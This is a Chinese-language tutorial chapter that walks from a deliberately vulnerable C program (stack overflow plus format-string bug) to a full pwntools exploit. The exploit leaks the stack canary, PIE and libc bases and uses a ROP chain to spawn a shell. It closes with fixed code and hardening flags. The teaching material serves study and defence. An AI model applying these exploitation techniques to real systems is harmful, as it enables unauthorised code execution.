# 实战案例：从漏洞发现到利用全流程

### 8.1 目标程序

以下是一个模拟的真实漏洞程序，包含信息泄露和栈溢出：

```c
// vuln_real.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void vulnerable() {
    char buf[64];
    printf("Input: ");
    read(0, buf, 0x200);    // 栈溢出：读取512字节到64字节缓冲区
    printf("Your input: ");
    printf(buf);            // 格式化字符串漏洞
    printf("\n");
}

int main() {
    init();
    vulnerable();
    return 0;
}
```

### 8.3 利用步骤

**步骤1: 确定格式化字符串偏移**

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

p = process('./vuln_real')

# 测试偏移
p.sendline(b'AAAA%p%p%p%p%p%p%p%p')
p.recvuntil(b'Your input: ')
result = p.recvline()
print(result)
# 如果看到0x4141414141414141在第n个位置，偏移就是n
# 假设偏移为6
```

**步骤2: 泄露Canary、libc和PIE基址**

```python
# 泄露Canary (通常在格式化字符串偏移+某位置)
# 泄露libc地址 (__libc_start_main返回地址)
# 泄露PIE基址 (代码段地址在栈上)

# 假设通过分析得知:
# 偏移6: 格式化字符串本身
# 偏移9: Canary
# 偏移11: 代码段地址（main返回地址附近）
# 偏移13: libc地址

payload = b'%9$p.%11$p.%13$p'
p.sendline(payload)
p.recvuntil(b'Your input: ')
result = p.recvline().strip()

parts = result.split(b'.')
canary = int(parts[0], 16)
code_leak = int(parts[1], 16)
libc_leak = int(parts[2], 16)

# 计算基址
canary_val = canary
pie_base = code_leak - 0xa30  # 需要通过分析确定偏移
libc_base = libc_leak - 0x21b97  # 需要通过分析确定偏移

log.info(f"Canary: {hex(canary_val)}")
log.info(f"PIE base: {hex(pie_base)}")
log.info(f"libc base: {hex(libc_base)}")
```

**步骤3: 构造ROP利用**

```python
# 获取system和/bin/sh地址
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

# 需要从代码段或libc中找gadget
# pop rdi; ret
pop_rdi = pie_base + 0xb93  # 在程序中查找
ret = pie_base + 0xb94      # 用于栈对齐

# 构造最终payload
# 栈布局: [buffer 64字节] [Canary 8字节] [RBP 8字节] [RET]
offset = 64 + 8 + 8  # buffer + canary + saved rbp

payload = b'A' * 64
payload += p64(canary_val)   # 保持Canary不变
payload += b'B' * 8          # 覆盖RBP（不影响利用）
payload += p64(ret)          # 栈对齐
payload += p64(pop_rdi)      # pop rdi; ret
payload += p64(binsh_addr)   # rdi = "/bin/sh"
payload += p64(system_addr)  # call system

p.sendline(payload)
p.interactive()
```

### 8.4 完整exploit脚本

```python
#!/usr/bin/env python3
"""
完整exploit - 绕过Canary + NX + PIE + ASLR
漏洞: 栈溢出 + 格式化字符串
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-h']

elf = ELF('./vuln_real')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def exploit():
    p = process('./vuln_real')
    
    # ========== 第一步：信息泄露 ==========
    log.info("=== 第一步: 信息泄露 ===")
    
    # 发送格式化字符串泄露Canary和地址
    # 通过分析确定偏移
    leak_payload = b'%9$p.%11$p.%13$p'
    p.sendline(leak_payload)
    
    p.recvuntil(b'Your input: ')
    result = p.recvline().strip()
    log.info(f"泄露数据: {result}")
    
    parts = result.split(b'.')
    canary = int(parts[0], 16)
    code_leak = int(parts[1], 16)
    libc_leak = int(parts[2], 16)
    
    # 计算基址（偏移需要通过分析确定）
    pie_base = code_leak - 0xa30
    libc_base = libc_leak - 0x21b97
    
    log.info(f"Canary:    {hex(canary)}")
    log.info(f"PIE base:  {hex(pie_base)}")
    log.info(f"libc base: {hex(libc_base)}")
    
    # ========== 第二步：构造ROP ==========
    log.info("=== 第二步: 构造ROP利用 ===")
    
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
    
    # 从程序中查找gadget (使用ROPgadget)
    pop_rdi = pie_base + 0xb93   # pop rdi; ret
    ret_gadget = pie_base + 0xb94  # ret (用于对齐)
    
    log.info(f"system:    {hex(system_addr)}")
    log.info(f"/bin/sh:  {hex(binsh_addr)}")
    
    # 构造payload
    offset = 72  # 64字节buffer + 8字节Canary
    
    payload = b'A' * 64           # 填充buffer
    payload += p64(canary)        # 保持Canary
    payload += b'B' * 8           # 覆盖saved RBP
    payload += p64(ret_gadget)    # 栈对齐
    payload += p64(pop_rdi)       # pop rdi; ret
    payload += p64(binsh_addr)    # rdi = "/bin/sh"
    payload += p64(system_addr)   # system("/bin/sh")
    
    # ========== 第三步：发送payload ==========
    log.info("=== 第三步: 发送利用payload ===")
    p.sendline(payload)
    
    # ========== 获取shell ==========
    log.success("获取shell!")
    p.interactive()

if __name__ == '__main__':
    exploit()
```

### 8.6 安全修复建议

```c
// 修复后的安全代码
void safe_function() {
    char buf[64];
    printf("Input: ");
    // 修复1: 限制读取长度
    ssize_t n = read(0, buf, sizeof(buf) - 1);
    if (n <= 0) return;
    buf[n] = '\0';
    
    // 修复2: 使用格式化字符串常量
    printf("Your input: %s\n", buf);
    
    // 或者使用puts
    // fputs("Your input: ", stdout);
    // fwrite(buf, 1, n, stdout);
    // putchar('\n');
}
```

**防御建议汇总：**

| 漏洞类型 | 防御措施 | 编译选项 |
|---------|---------|---------|
| 栈溢出 | 使用安全函数，边界检查 | -fstack-protector-strong |
| 格式化字符串 | 使用printf("%s", input) | -Wformat -Werror=format-security |
| 堆溢出 | 安全释放，使用智能指针 | -D_FORTIFY_SOURCE=2 |
| UAF | 释放后置空指针，使用智能指针 | -fsanitize=address (调试) |
| 整数溢出 | 使用安全整数库 | -ftrapv |
| 竞争条件 | 使用锁，原子操作 | - |
| 通用防护 | 全部开启 | -fPIE -pie -Wl,-z,relro,-z,now |
